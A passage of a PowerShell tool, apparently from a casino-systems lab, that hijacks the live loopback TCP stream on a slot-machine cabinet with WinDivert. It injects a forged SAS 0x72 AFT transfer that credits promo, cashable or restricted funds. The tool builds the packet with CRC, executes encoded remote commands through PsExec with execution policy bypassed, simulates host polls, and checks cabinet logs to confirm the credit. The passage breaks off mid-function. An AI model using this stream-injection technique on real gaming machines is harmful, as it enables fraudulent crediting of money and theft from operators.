<#
.SYNOPSIS
    Inject a raw SAS 0x72 AFT "transfer funds" ($1,000 promo) command into the EXISTING
    CommCtrlSAS -> Aurum loopback TCP stream using WinDivert, with no IGT tester.

.DESCRIPTION
    A plain TcpClient to bridge port 31150 opens a NEW connection that CommCtrlSAS never
    merges into the live SAS stream, so Aurum never ingests it (proven dead-end; see the
    "What does NOT work" section of aft/RUNBOOK.md).

    This tool instead uses WinDivert to capture the live outbound flow
    CommCtrlSAS:31150 -> Aurum:<ephemeral>, forwards every packet unchanged, and on the
    first data packet injects a crafted TCP segment carrying our 0x1B-framed SAS 0x72
    command at SEQ = origSeq + origPayloadLen, into the same flow. Aurum reads it as the
    next in-order bytes on its established SAS connection and processes the transfer.

    The ephemeral destination port is discovered live by WdInject.exe (never hardcoded).
    A SAS link RST/reconnect after the injection is expected and acceptable.

    Default mode is -DryRun (no staging, no injection).

.EXAMPLE
    .\Invoke-WinDivertAft.ps1 -DryRun

.EXAMPLE
    .\Invoke-WinDivertAft.ps1 -Send

.EXAMPLE
    # Optional: force a specific two-digit transaction number for debugging only.
    # Normal use should leave this unset so duplicate ids are avoided.
    .\Invoke-WinDivertAft.ps1 -Send -TransactionNumber 31

.EXAMPLE
    # Target a different cabinet by IP (-IP is an alias of -ComputerName)
    .\Invoke-WinDivertAft.ps1 -Send -IP 10.0.0.110
#>
[CmdletBinding(DefaultParameterSetName = 'DryRun')]
param(
    [Alias('h')]
    [switch] $Help,

    [Alias('IP')]
    [string] $ComputerName = '10.0.0.90',
    [int64]  $AmountCents = 100000,
    [int64]  $Amount = 0,
    [int]    $AssetNumber = 777,
    [int]    $TransactionNumber = 0,
    [byte]   $SasAddress = 0x01,
    [int]    $BridgePort = 31150,

    # Observation window (ms) WdInject.exe waits for ANY outbound segment on $BridgePort
    # before giving up, and the ACK-anchor grace window (ms): when only bare ACKs flow on
    # an idle-but-ESTABLISHED connection, WdInject prefers a payload segment for this long
    # before anchoring on the latest pure-ACK seq. $AckGraceMs = 0 disables ACK-anchoring
    # (legacy payload-only behavior). The grace window must fit inside $ObserveMs.
    [int]    $ObserveMs = 8000,
    [int]    $AckGraceMs = 600,

    [string] $PsExecPath = 'C:\Tools\PSTools\PsExec.exe',
    [string] $WinDivertDir = 'C:\Tools\WinDivert\extracted\WinDivert-2.2.2-A\x64',
    [int]    $MaxRetries = 3,

    # When -Send and cabinet sasmsgr shows no recent 80/81 polls, establish host polls:
    #   Auto (default) — WinDivert TCP poll sim on the cabinet (no COM/MUX); fallback COM4 keeper
    #   WinDivert      — TCP poll sim only (WdPollInject pollaft + AFT in one session)
    #   Com            — legacy COM4 sas_poll_keeper + separate WdInject.exe
    #   None           — no auto polls (-NoAutoSasPoll forces this)
    [ValidateSet('Auto', 'WinDivert', 'Com', 'None')]
    [string] $SasPollMode = 'Auto',
    [string] $SasComPort = 'COM4',
    [int]    $SasPollWarmupSec = 4,
    [int]    $WinDivertPollSeconds = 8,
    [int]    $WinDivertPollIntervalMs = 200,
    [int]    $WinDivertPollInjectDelayMs = 2000,
    [int]    $WinDivertPollDrainSec = 4,
    [int]    $WinDivertEphemWaitSec = 90,
    [AllowNull()][datetime] $PollBaselineUtc = $null,
    [int]    $PollAftRetryDelaySec = 25,
    [switch] $NoAutoSasPoll,

    # WinRM by IP needs explicit NTLM credentials. On lab fleet IPs this is auto-filled
    # from LabAccess.ps1 (GOLD-CLUB\test) unless you pass -Credential yourself.
    [pscredential] $Credential,

    # Transfer-type selection: route the amount into exactly one SAS 0x72 amount
    # field. Default (none) = non-restricted (promo), the verified working behavior.
    [Alias('c')]  [switch] $Cashable,
    [Alias('r')]  [switch] $Restricted,
    [Alias('nr')] [switch] $NonRestricted,

    # Maintenance: safely tear down the WinDivert driver service on the cabinet, then
    # exit. Only deletes when the service is actually STOPPED (never while STOP_PENDING),
    # so it cannot create the "marked for deletion" wedge. Runs no injection.
    [switch] $RemoveDriver,

    [Parameter(ParameterSetName = 'DryRun')]
    [switch] $DryRun,

    [Parameter(ParameterSetName = 'Send', Mandatory = $true)]
    [switch] $Send,

    [Parameter(ValueFromRemainingArguments = $true)]
    [object[]] $RemainingArgs
)

Set-StrictMode -Version Latest
$ErrorActionPreference = 'Stop'

function Resolve-WinDivertDir {
    param([string] $Preferred)
    $candidates = @()
    if ($Preferred) { $candidates += $Preferred }
    $candidates += @(
        'C:\Tools\WinDivert\extracted\WinDivert-2.2.2-A\x64',
        'C:\Tools\WinDivert\x64'
    )
    foreach ($dir in ($candidates | Select-Object -Unique)) {
        $dll = Join-Path $dir 'WinDivert.dll'
        $sys = Join-Path $dir 'WinDivert64.sys'
        if ((Test-Path -LiteralPath $dll) -and (Test-Path -LiteralPath $sys)) {
            return $dir
        }
    }
    throw @(
        'WinDivert x64 not found. Expected WinDivert.dll + WinDivert64.sys under one of:',
        '  C:\Tools\WinDivert\x64',
        '  C:\Tools\WinDivert\extracted\WinDivert-2.2.2-A\x64',
        'Pass -WinDivertDir <folder> or extract WinDivert 2.2.2 x64 to C:\Tools\WinDivert\x64.'
    ) -join "`n"
}

function Show-WinDivertAftHelp {
    $runbook = Join-Path $PSScriptRoot 'aft\RUNBOOK.md'
    $readme = Join-Path $PSScriptRoot 'aft\README.md'
    Write-Host @"
Invoke-WinDivertAft.ps1 — inject raw SAS 0x72 AFT transfer into live CommCtrlSAS:31150 -> Aurum stream (WinDivert).

PREREQUISITES
  Cabinet reachable (admin C$), PsExec + WinDivert on this host, CommCtrlSAS + Aurum running.
  On -Send, if cabinet polls are stale, host polls are auto-established:
    -SasPollMode Auto     WinDivert TCP poll sim (1B80/1B81 @200ms on loopback 31150) — no COM/MUX
    -SasPollMode WinDivert same, no COM fallback
    -SasPollMode Com      legacy COM4 poll keeper (close IGT tester first)
    -NoAutoSasPoll        skip auto polls (IGT or external host must already be polling)

MODES
  Default = DryRun (prints packet; injects nothing). Pass -Send for live injection.

TARGET
  -IP <addr>  or  -ComputerName <addr>   (default 10.0.0.90)

AMOUNT (raw credits / base units; default 100000 = `$1,000 if 1 unit = 1 cent)
  -Amount <int>              explicit amount (also: unnamed int after -IP, or after -c/-r/-nr)
  -AmountCents <int>         legacy alias for -Amount

TRANSFER TYPE (exactly one; default = non-restricted/promo)
  -nr [<amount>]   non-restricted (promo)
  -c  [<amount>]   cashable
  -r  [<amount>]   restricted

EXAMPLES (see $runbook)
  .\Invoke-WinDivertAft.ps1 -Help
  .\Invoke-WinDivertAft.ps1 -DryRun
  .\Invoke-WinDivertAft.ps1 -Send -IP 10.0.0.90 -c 1000000
  .\Invoke-WinDivertAft.ps1 -Send -IP 10.0.0.90 -nr
  .\Invoke-WinDivertAft.ps1 -Send -IP 10.0.0.90 1000000 -c
  .\Invoke-WinDivertAft.ps1 -Send -IP 10.0.0.110 -Amount 1000000 -c

TRANSPORT
  WinRM (port 5985) is preferred when reachable — much faster than PsExec (~2-5s vs ~45s).
  Lab fleet IPs auto-use GOLD-CLUB\test (see LabAccess.ps1 / Initialize-LabAccess.ps1).

DOCS
  $runbook
  $readme
"@
}

$script:PsExecAuthArgs = @()
$script:CredentialFromLab = $false
$labRemoteTransportPath = Join-Path $PSScriptRoot 'LabRemoteTransport.ps1'
if (-not (Test-Path -LiteralPath $labRemoteTransportPath)) {
    throw "Missing $labRemoteTransportPath"
}
. $labRemoteTransportPath
$labCtx = Initialize-LabRemoteContext -ComputerName $ComputerName -Credential $Credential
$Credential = $labCtx.Credential
$script:CredentialFromLab = $labCtx.CredentialFromLab
$script:PsExecAuthArgs = @($labCtx.PsExecAuthArgs)

if ($Help -or $RemainingArgs -contains '/?' -or $RemainingArgs -contains '-?') {
    Show-WinDivertAftHelp
    exit 0
}

# Optional positional amount: one unnamed positive int (after -IP and/or after -c/-r/-nr).
$trailingArgs = @($RemainingArgs) | Where-Object { $_ -ne $null -and [string]$_ -ne '' }
$positionalAmount = $null
$unexpectedTrailing = New-Object System.Collections.Generic.List[object]
foreach ($arg in $trailingArgs) {
    $text = [string]$arg
    if ($null -eq $positionalAmount -and $text -match '^\d+$') {
        $parsed = [int64]$text
        if ($parsed -gt 0) {
            $positionalAmount = $parsed
            continue
        }
    }
    $unexpectedTrailing.Add($arg) | Out-Null
}
if ($unexpectedTrailing.Count -gt 0) {
    throw "Unexpected argument(s): $($unexpectedTrailing -join ', '). Run with -Help for usage."
}
if ($null -ne $positionalAmount) {
    if ($PSBoundParameters.ContainsKey('Amount') -and $Amount -gt 0 -and $Amount -ne $positionalAmount) {
        throw "Conflicting amount: -Amount $Amount vs positional $positionalAmount. Run with -Help for usage."
    }
    if (-not $PSBoundParameters.ContainsKey('Amount') -or $Amount -le 0) {
        $Amount = $positionalAmount
    }
}

# Whole-run stopwatch: the final TIMING block reports the full cycle (and phase breakdown).
$swTotal = [System.Diagnostics.Stopwatch]::StartNew()

if ($RemoveDriver) {
    # Explicit, SAFE teardown. The per-run path never deletes the service (see the remote
    # finally), so this is the only place we remove it -- and it deletes ONLY when the
    # service is actually STOPPED. If it is STOP_PENDING (a referenced/wedged driver), we
    # refuse to delete (deleting then is what marks it for deletion until reboot) and tell
    # the operator a reboot is required.
    if (-not (Test-Path -LiteralPath $PsExecPath)) {
        throw "PsExec not found at $PsExecPath (needed for -RemoveDriver)."
    }
    Write-Host "[*] Safe WinDivert teardown on $ComputerName ..." -ForegroundColor Cyan
    $teardown = @'
$ErrorActionPreference = 'Continue'
$q = (& sc.exe query WinDivert 2>&1) -join "`n"
if ($q -match '1060') { 'WINDIVERT_NOT_INSTALLED'; return }
if ($q -match 'STOP_PENDING') { 'WINDIVERT_STOP_PENDING_REBOOT_REQUIRED'; return }
& sc.exe stop WinDivert | Out-Null
for ($i = 0; $i -lt 24; $i++) {
    $s = (& sc.exe query WinDivert 2>&1) -join "`n"
    if ($s -match '1060' -or $s -match 'STOPPED' -or $s -match 'STOP_PENDING') { break }
    Start-Sleep -Milliseconds 250
}
$s = (& sc.exe query WinDivert 2>&1) -join "`n"
if ($s -match '1060') { 'WINDIVERT_NOT_INSTALLED' }
elseif ($s -match 'STOP_PENDING') { 'WINDIVERT_STOP_PENDING_REBOOT_REQUIRED' }
elseif ($s -match 'STOPPED') { & sc.exe delete WinDivert | Out-Null; 'WINDIVERT_DELETED' }
else { 'WINDIVERT_NOT_STOPPED_SKIP_DELETE' }
'@
    $enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($teardown))
    $psArgs = @("\\$ComputerName", '-accepteula') + @($script:PsExecAuthArgs) + @('-s', '-n', '30',
        'powershell.exe', '-NoProfile', '-ExecutionPolicy', 'Bypass', '-EncodedCommand', $enc)
    $result = (& $PsExecPath @psArgs 2>&1) | Out-String
    switch -Regex ($result) {
        'WINDIVERT_DELETED' { Write-Host "[+] WinDivert service stopped and deleted cleanly." -ForegroundColor Green }
        'WINDIVERT_NOT_INSTALLED' { Write-Host "[*] WinDivert service is not installed (nothing to remove)." -ForegroundColor Green }
        'WINDIVERT_STOP_PENDING_REBOOT_REQUIRED' { Write-Warning "WinDivert is STOP_PENDING (referenced kernel driver). NOT deleting (would mark-for-deletion). Reboot $ComputerName to clear it." }
        'WINDIVERT_NOT_STOPPED_SKIP_DELETE' { Write-Warning "WinDivert did not reach STOPPED in time; skipped delete to avoid a wedge. Retry shortly or reboot $ComputerName." }
        default { Write-Warning "Teardown result unclear:`n$result" }
    }
    return
}

function Test-CabinetAftTransactionSeen {
    param(
        [string] $Computer,
        [int]    $TxnNumber
    )
    $logPath = "\\$Computer\c`$\Goldclub\var\log\GoldClub.Aurum.Services sasmsgr of SASControler1\$((Get-Date).ToString('yyyy-MM-dd')).log"
    if (-not (Test-Path -LiteralPath $logPath)) { return $false }

    $txnHex = -join ([Text.Encoding]::ASCII.GetBytes("Transaction$TxnNumber") | ForEach-Object { '{0:X2}' -f $_ })
    # sasmsgr logs are large on the lab cabinet. A bounded tail scan catches the
    # recently burned ids that matter for retries/resets without making dry-runs
    # wait on a full UNC file scan.
    return [bool](Get-Content -LiteralPath $logPath -Tail 12000 -ErrorAction SilentlyContinue | Select-String -Pattern $txnHex -SimpleMatch -Quiet)
}

$autoTransactionStatePath = $null
$autoTransactionState = $null
$autoTransactionNext = $null
if ($TransactionNumber -le 0) {
    $statePath = Join-Path $PSScriptRoot '.aft-windivert-next-transaction.json'
    $state = @{}
    if (Test-Path -LiteralPath $statePath) {
        try {
            $json = Get-Content -LiteralPath $statePath -Raw | ConvertFrom-Json
            foreach ($p in $json.PSObject.Properties) { $state[$p.Name] = [int]$p.Value }
        }
        catch {
            $state = @{}
        }
    }

    $next = if ($state.ContainsKey($ComputerName)) { [int]$state[$ComputerName] } else { 42 }
    if ($next -lt 10 -or $next -gt 99) { $next = 42 }

    $skippedSeen = New-Object System.Collections.Generic.List[int]
    for ($i = 0; $i -lt 90; $i++) {
        if (-not (Test-CabinetAftTransactionSeen -Computer $ComputerName -TxnNumber $next)) { break }
        $skippedSeen.Add($next) | Out-Null
        $next++
        if ($next -gt 99) { $next = 10 }
    }
    if ($skippedSeen.Count -ge 90) {
        throw "All auto transaction numbers 10..99 already appear in today's sasmsgr log for $ComputerName; pass -TransactionNumber explicitly or clear old cabinet logs."
    }
    if ($skippedSeen.Count -gt 0) {
        Write-Host ("[*] Auto transaction id(s) already seen today for {0}; skipped: {1}" -f $ComputerName, ($skippedSeen -join ', ')) -ForegroundColor DarkGray
    }

    $TransactionNumber = $next

    $next++
    if ($next -gt 99) { $next = 10 }
    $state[$ComputerName] = $next
    $autoTransactionStatePath = $statePath
    $autoTransactionState = $state
    $autoTransactionNext = $next
}

# ---- SAS 0x72 packet builder (see aft/protocol-raw-traffic.md for the byte layout) ----

function ConvertTo-Hex {
    param([byte[]] $Bytes)
    -join ($Bytes | ForEach-Object { '{0:X2}' -f $_ })
}

function ConvertTo-Bcd5 {
    param([int64] $Value)
    if ($Value -lt 0 -or $Value -gt 9999999999) {
        throw "BCD amount out of range: $Value"
    }
    $digits = ('{0:D10}' -f $Value)
    $bytes = New-Object byte[] 5
    for ($i = 0; $i -lt 5; $i++) {
        $hi = [int][string]$digits[$i * 2]
        $lo = [int][string]$digits[$i * 2 + 1]
        $bytes[$i] = [byte](($hi -shl 4) -bor $lo)
    }
    return $bytes
}

function Get-SasCrc16 {
    param([byte[]] $Bytes)
    # SAS uses CRC-16/KERMIT (poly 0x1021 reflected as 0x8408), sent little-endian.
    $crc = 0
    foreach ($b in $Bytes) {
        $crc = $crc -bxor $b
        for ($i = 0; $i -lt 8; $i++) {
            if (($crc -band 1) -ne 0) {
                $crc = ($crc -shr 1) -bxor 0x8408
            }
            else {
                $crc = $crc -shr 1
            }
            $crc = $crc -band 0xFFFF
        }
    }
    return [uint16]$crc
}

function New-AftTransferPacket {
    param(
        [byte] $Address,
        # Backward-compatible alias for the non-restricted (promo) amount.
        [int64] $PromoAmountCents = 0,
        [int64] $CashableAmount = 0,
        [int64] $RestrictedAmount = 0,
        [int64] $NonRestrictedAmount = 0,
        [int] $Asset,
        [int] $TxnNumber
    )

    # Map the legacy single-amount call to the non-restricted field.
    if ($PromoAmountCents -gt 0 -and $NonRestrictedAmount -eq 0) {
        $NonRestrictedAmount = $PromoAmountCents
    }

    $data = New-Object System.Collections.Generic.List[byte]
    $data.Add(0x00) # transfer code: in-house amount from host to EGM
    $data.Add(0x00) # transaction index
    # Transfer type byte kept at 0x00 for all field selections. The existing
    # verified promo injection used 0x00; the cashable/restricted/non-restricted
    # routing is expressed purely by which BCD amount field is non-zero (see report).
    $data.Add(0x00) # transfer type
    $data.AddRange([byte[]](ConvertTo-Bcd5 $CashableAmount))       # cashable
    $data.AddRange([byte[]](ConvertTo-Bcd5 $RestrictedAmount))     # restricted
    $data.AddRange([byte[]](ConvertTo-Bcd5 $NonRestrictedAmount))  # non-restricted (promo)
    $data.Add(0x00) # transfer flags
    $data.AddRange([BitConverter]::GetBytes([uint32]$Asset)) # asset number little-endian
    $data.AddRange((New-Object byte[] 20))                   # registration key (machine NOT registered)

    $txnText = "est Transaction$TxnNumber"
    $txnBytes = New-Object System.Collections.Generic.List[byte]
    $txnBytes.Add(0x00)
    $txnBytes.AddRange([Text.Encoding]::ASCII.GetBytes($txnText))
    $data.Add([byte]$txnBytes.Count)
    $data.AddRange($txnBytes)

    $data.AddRange([byte[]](0x05, 0x30, 0x20, 0x20)) # expiration
    $data.AddRange([byte[]](0x0C, 0x00))             # pool id 0x000C
    $data.Add(0x00)                                  # receipt data length

    $packetNoCrc = New-Object System.Collections.Generic.List[byte]
    $packetNoCrc.Add($Address)
    $packetNoCrc.Add(0x72)
    $packetNoCrc.Add([byte]$data.Count)
    $packetNoCrc.AddRange($data)

    $crc = Get-SasCrc16 ([byte[]]$packetNoCrc.ToArray())
    $packetNoCrc.Add([byte]($crc -band 0xFF))
    $packetNoCrc.Add([byte](($crc -shr 8) -band 0xFF))
    return [byte[]]$packetNoCrc.ToArray()
}

# ---- log verification helpers ----

function Get-LogLineUtc {
    param([string] $TimestampText)
    $t = $TimestampText.Trim()
    if ($t -match 'T') {
        return ([datetimeoffset]$t).UtcDateTime
    }
    # Legacy cabinet lines without offset are Europe/Berlin (+01:00 in summer).
    $parsed = [datetime]::ParseExact($t, @('yyyy-MM-dd HH:mm:ss', 'yyyy-MM-dd HH:mm:ss.fff'), $null, [Globalization.DateTimeStyles]::AllowWhiteSpaces)
    return [datetimeoffset]::new($parsed, [timespan]::FromHours(1)).UtcDateTime
}

function Test-LogLineAfter {
    param(
        [string] $Line,
        [datetime] $SinceUtc,
        [int]    $SlackSeconds = 3
    )
    if ($Line -notmatch '^(\S+)') { return $false }
    try {
        $lineUtc = Get-LogLineUtc $Matches[1]
    }
    catch {
        return $false
    }
    return $lineUtc -ge $SinceUtc.AddSeconds(-$SlackSeconds)
}

function Test-LogLineBetween {
    param(
        [string] $Line,
        [datetime] $StartUtc,
        [datetime] $EndUtc,
        [int]    $SlackSeconds = 1
    )
    if ($Line -notmatch '^(\S+)') { return $false }
    try {
        $lineUtc = Get-LogLineUtc $Matches[1]
    }
    catch {
        return $false
    }
    return $lineUtc -ge $StartUtc.AddSeconds(-$SlackSeconds) -and $lineUtc -le $EndUtc
}

function Get-DatedLogPath {
    param([string] $Computer, [string] $SubFolder, [datetime] $Date)
    $name = $Date.ToString('yyyy-MM-dd')
    return "\\$Computer\c`$\Goldclub\var\log\$SubFolder\$name.log"
}

function Test-SasMessengerIngested {
    # Returns the matching qGMID1 line (timestamp >= SinceUtc) or $null.
    # Must match the FULL SAS packet hex (txn id + CRC are unique per run).
    param(
        [string] $Computer,
        [string] $PacketHex,
        [datetime] $SinceUtc
    )
    $logPath = Get-DatedLogPath -Computer $Computer -SubFolder 'GoldClub.Aurum.Services sasmsgr of SASControler1' -Date (Get-Date)
    if (-not (Test-Path -LiteralPath $logPath)) { return $null }

    $needle = $PacketHex.ToUpperInvariant()
    # Tail-scan only: the injected line is the newest qGMID1 entry, so reading the tail
    # (instead of the multi-MB full-day log) keeps repeated polling fast and light.
    $hits = Get-Content -LiteralPath $logPath -Tail 800 -ErrorAction SilentlyContinue | Select-String -Pattern 'qGMID1:0172'
    foreach ($hit in @($hits)) {
        $line = $hit.Line
        if (-not (Test-LogLineAfter -Line $line -SinceUtc $SinceUtc)) { continue }
        if ($line.ToUpperInvariant().Contains($needle)) {
            return $line
        }
    }
    return $null
}

function Find-CreditEvidence {
    param(
        [string] $Computer,
        [datetime] $StartUtc,
        [datetime] $EndUtc,
        [int64]  $Amount,
        [string] $TransferType
    )
    $results = New-Object System.Collections.Generic.List[string]
    $amountDollars = [string]::Format([Globalization.CultureInfo]::GetCultureInfo('en-US'), '${0:N2}', ([double]$Amount / 100.0))
    $amountDollarsPattern = [regex]::Escape($amountDollars)
    $amountRawPattern = [regex]::Escape([string]$Amount)
    $fieldPattern = switch ($TransferType) {
        'cashable'       { 'cashable' }
        'restricted'     { 'restricted' }
        default          { 'promo|non-?restricted' }
    }
    $slotLogPattern = switch ($TransferType) {
        'cashable'       { "Cashless In: ${amountDollarsPattern}|cashable credit state increased to ${amountRawPattern}" }
        'restricted'     { "Cashless In: ${amountDollarsPattern}|restricted credit state increased to ${amountRawPattern}" }
        default          { "Cashless In: ${amountDollarsPattern}|promo credit state increased to ${amountRawPattern}" }
    }
    $subFolders = @(
        @{ Folder = 'OneHand GM2AU'; Pattern = "Withdraw successful GCC_ST_\d+_01 .*${amountRawPattern}.*(${fieldPattern}|promo)" },
        @{ Folder = 'OneHand TRANSACTION EVENTS'; Pattern = "Transfer IN .*${amountDollarsPattern}.*(${fieldPattern}|promo)" },
        @{ Folder = 'SlotLog'; Pattern = $slotLogPattern },
        @{ Folder = 'GoldClub.Aurum.Services'; Pattern = "TRANSFER REQUEST FROM SERVER STARTED.*(Cashable|NonRestricted|Restricted)\(${amountRawPattern}\)" }
    )
    foreach ($sf in $subFolders) {
        $logPath = Get-DatedLogPath -Computer $Computer -SubFolder $sf.Folder -Date (Get-Date)
        if (-not (Test-Path -LiteralPath $logPath)) { continue }
        $hits = Get-Content -LiteralPath $logPath -Tail 1500 -ErrorAction SilentlyContinue | Select-String -Pattern $sf.Pattern
        foreach ($hit in @($hits)) {
            $line = $hit.Line
            if (Test-LogLineBetween -Line $line -StartUtc $StartUtc -EndUtc $EndUtc) {
                $results.Add(("[{0}] {1}" -f $sf.Folder, $line.Trim()))
            }
        }
    }
    return ,[string[]]($results.ToArray())
}

function Find-AftFailureEvidence {
    param(
        [string]   $Computer,
        [datetime] $StartUtc,
        [datetime] $EndUtc,
        [int]      $TxnNumber
    )
    $results = New-Object System.Collections.Generic.List[string]
    $logPath = Get-DatedLogPath -Computer $Computer -SubFolder 'GoldClub.Aurum.Services' -Date (Get-Date)
    if (-not (Test-Path -LiteralPath $logPath)) { return $results }

    $txnToken = "Transaction$TxnNumber"
    $patterns = @(
        'CASHOUT BUTTON PRESSED',
        'AFT EXCEPTION ISSUED',
        'AFT PRIORITY EXCEPTION',
        'TRANSFER AMOUNTS MISMATCH',
        'TRANSFER REQUEST FROM SERVER FINISHED.*UNEXPECTED_ERROR',
        "TRANSFER REQUEST FROM SERVER FINISHED.*$txnToken",
        "TRANSFER REQUEST FROM SERVER STARTED.*$txnToken"
    )
    foreach ($line in (Get-Content -LiteralPath $logPath -Tail 2500 -ErrorAction SilentlyContinue)) {
        if (-not (Test-LogLineBetween -Line $line -StartUtc $StartUtc -EndUtc $EndUtc)) { continue }
        foreach ($pat in $patterns) {
            if ($line -match $pat) {
                $results.Add($line.Trim())
                break
            }
        }
    }
    return $results
}

function Test-CabinetSasPollsRecent {
    param(
        [string] $Computer,
        [int]    $WithinSeconds = 15,
        $SinceUtc = $null
    )
    $logPath = Get-DatedLogPath -Computer $Computer -SubFolder 'GoldClub.Aurum.Services sasmsgr of SASControler1' -Date (Get-Date)
    if (-not (Test-Path -LiteralPath $logPath)) { return $false }
    $cutoff = if ($null -ne $SinceUtc) { [datetime]$SinceUtc } else { (Get-Date).ToUniversalTime().AddSeconds(-[math]::Abs($WithinSeconds)) }
    foreach ($line in (Get-Content -LiteralPath $logPath -Tail 80 -ErrorAction SilentlyContinue)) {
        if ($line -notmatch 'qGMID1:8[01]\s*$') { continue }
        if ($line -notmatch '^(\S+)') { continue }
        try {
            $lineUtc = Get-LogLineUtc $Matches[1]
        }
        catch {
            continue
        }
        if ($null -ne $SinceUtc) {
            if ($lineUtc -gt [datetime]$SinceUtc) { return $true }
        }
        elseif ($lineUtc -ge $cutoff) {
            return $true
        }
    }
    return $false
}

function Get-CabinetLatestPollLine {
    param(
        [string] $Computer,
        [string] $Pattern = 'qGMID1:8[01]\s*$'
    )
    $logPath = Get-DatedLogPath -Computer $Computer -SubFolder 'GoldClub.Aurum.Services sasmsgr of SASControler1' -Date (Get-Date)
    if (-not (Test-Path -LiteralPath $logPath)) { return $null }
    $hits = Get-Content -LiteralPath $logPath -Tail 120 -ErrorAction SilentlyContinue | Select-String -Pattern $Pattern
    if (-not $hits) { return $null }
    return ($hits | Select-Object -Last 1).Line.Trim()
}

function Resolve-SasPollKeeperScript {
    $candidates = @(
        (Join-Path $PSScriptRoot 'scripts\sas_poll_keeper_standalone.py'),
        (Join-Path $PSScriptRoot 'scripts\sas_poll_keeper.py')
    )
    $repoRoot = Split-Path $PSScriptRoot -Parent
    if ($repoRoot) {
        $candidates += Join-Path $repoRoot 'GoldclubLogInvestigator\scripts\sas_poll_keeper_standalone.py'
        $candidates += Join-Path $repoRoot 'GoldclubLogInvestigator\scripts\sas_poll_keeper.py'
    }
    foreach ($path in $candidates) {
        if ($path -and (Test-Path -LiteralPath $path)) {
            return $path
        }
    }
    return $null
}

function Test-SasComPortAvailable {
    param([string] $Port = 'COM4')
    $keeper = Resolve-SasPollKeeperScript
    if (-not $keeper) {
        return @{ Ok = $false; Message = "Missing SAS poll keeper script under $PSScriptRoot\scripts (expected sas_poll_keeper_standalone.py)" }
    }
    $py = Get-Command python -ErrorAction SilentlyContinue
    if (-not $py) {
        return @{ Ok = $false; Message = 'python not found on PATH (needed for COM poll probe)' }
    }
    $probe = & $py.Source $keeper '--probe' $Port 2>&1 | Out-String
    $probe = $probe.Trim()
    $ok = ($LASTEXITCODE -eq 0)
    return @{ Ok = $ok; Message = $(if ($probe) { $probe } else { "COM probe exit $LASTEXITCODE" }) }
}

function Start-SasPollKeeper {
    param(
        [string] $Port = 'COM4',
        [int]    $WarmupSec = 4
    )
    $keeper = Resolve-SasPollKeeperScript
    if (-not $keeper) {
        throw "Missing SAS poll keeper script under $PSScriptRoot\scripts"
    }
    $py = Get-Command python -ErrorAction SilentlyContinue
    if (-not $py) {
        throw 'python not found on PATH (needed for SAS poll keeper)'
    }
    $warmupMs = [math]::Max(0, $WarmupSec * 1000)
    $args = @(
        $keeper,
        $Port,
        '--interval-ms', '200',
        '--warmup-s', ([string]([math]::Max(0.5, $WarmupSec)))
    )
    $proc = Start-Process -FilePath $py.Source -ArgumentList $args `
        -WorkingDirectory $PSScriptRoot -WindowStyle Hidden -PassThru
    Start-Sleep -Milliseconds ([math]::Min(1500, $warmupMs))
    return $proc
}

function Stop-SasPollKeeper {
    param([System.Diagnostics.Process] $Process)
    if ($null -eq $Process) { return }
    if ($Process.HasExited) { return }
    try {
        Stop-Process -Id $Process.Id -Force -ErrorAction Stop
    }
    catch {
        Write-Host "[!] Could not stop SAS poll keeper (pid $($Process.Id)): $_" -ForegroundColor Yellow
    }
}

function Wait-CabinetSasPolls {
    param(
        [string] $Computer,
        [int]    $TimeoutSec = 15,
        [int]    $WithinSeconds = 8
    )
    $deadline = (Get-Date).AddSeconds([math]::Max(1, $TimeoutSec))
    do {
        if (Test-CabinetSasPollsRecent -Computer $Computer -WithinSeconds $WithinSeconds) {
            return $true
        }
        Start-Sleep -Milliseconds 400
    } while ((Get-Date) -lt $deadline)
    return $false
}

function Start-AutoSasPollKeeperIfNeeded {
    param(
        [string] $Computer,
        [string] $Port = 'COM4',
        [int]    $WarmupSec = 4
    )
    if (Test-CabinetSasPollsRecent -Computer $Computer -WithinSeconds 12) {
        Write-Host '[+] SAS general polls already active on cabinet (external host or prior session).' -ForegroundColor Green
        return @{ Ok = $true; Process = $null; Message = 'Cabinet polls already active' }
    }
    Write-Host '[*] No recent cabinet 80/81 polls — checking whether host COM port is free...' -ForegroundColor Cyan
    $probe = Test-SasComPortAvailable -Port $Port
    if (-not $probe.Ok) {
        Write-Host "[!] $($probe.Message)" -ForegroundColor Yellow
        return @{
            Ok      = $false
            Process = $null
            Message = "$($probe.Message). Start the IGT SAS tester on the MUX port, or free $Port so the built-in poll keeper can run."
        }
    }
    Write-Host "[+] $($probe.Message)" -ForegroundColor Green
    Write-Host "[*] Starting built-in SAS poll keeper on $Port (IGT-tester-style 80/81 @200ms)..." -ForegroundColor Cyan
    try {
        $proc = Start-SasPollKeeper -Port $Port -WarmupSec $WarmupSec
    }
    catch {
        return @{ Ok = $false; Process = $null; Message = "Could not start SAS poll keeper: $_" }
    }
    if (Wait-CabinetSasPolls -Computer $Computer -TimeoutSec 15) {
        Write-Host '[+] Cabinet sasmsgr shows live 80/81 polls — safe to inject.' -ForegroundColor Green
        return @{ Ok = $true; Process = $proc; Message = 'Poll keeper active' }
    }
    Write-Host '[!] Poll keeper started but cabinet log still shows no fresh 80/81 within 15s.' -ForegroundColor Yellow
    return @{
        Ok      = $false
        Process = $proc
        Message = "Poll keeper started on $Port but cabinet sasmsgr still shows no fresh qGMID1:80/81 within 15s. Check MUX cable, cabinet power, and COM wiring."
    }
}

function Resolve-SasPollStrategy {
    param(
        [string] $Computer,
        [string] $Mode
    )
    if ($Mode -eq 'None') {
        return @{
            PollsActive  = (Test-CabinetSasPollsRecent -Computer $Computer -WithinSeconds 12)
            UsePollAft   = $false
            UseComKeeper = $false
        }
    }
    if (Test-CabinetSasPollsRecent -Computer $Computer -WithinSeconds 12) {
        return @{
            PollsActive  = $true
            UsePollAft   = $false
            UseComKeeper = $false
            Message      = 'Cabinet polls already active'
        }
    }
    switch ($Mode) {
        'Com' {
            return @{ PollsActive = $false; UsePollAft = $false; UseComKeeper = $true }
        }
        'WinDivert' {
            return @{ PollsActive = $false; UsePollAft = $true; UseComKeeper = $false }
        }
        default {
            return @{ PollsActive = $false; UsePollAft = $true; UseComKeeper = $true }
        }
    }
}

function Test-WdPollInjectOpenOk {
    param([string] $Output)
    return [bool]($Output -match '(?m)OPEN ok\s*$')
}

function Test-WdPollAftInjected {
    param([string] $Output)
    return [bool]($Output -match 'AFT_INJECTED')
}

function New-WinDivertPollAftRemoteScript {
    param(
        [string] $RemoteRunPath,
        [string] $BridgePayloadHex,
        [int]    $BridgePort,
        [int]    $RunSeconds,
        [int]    $IntervalMs,
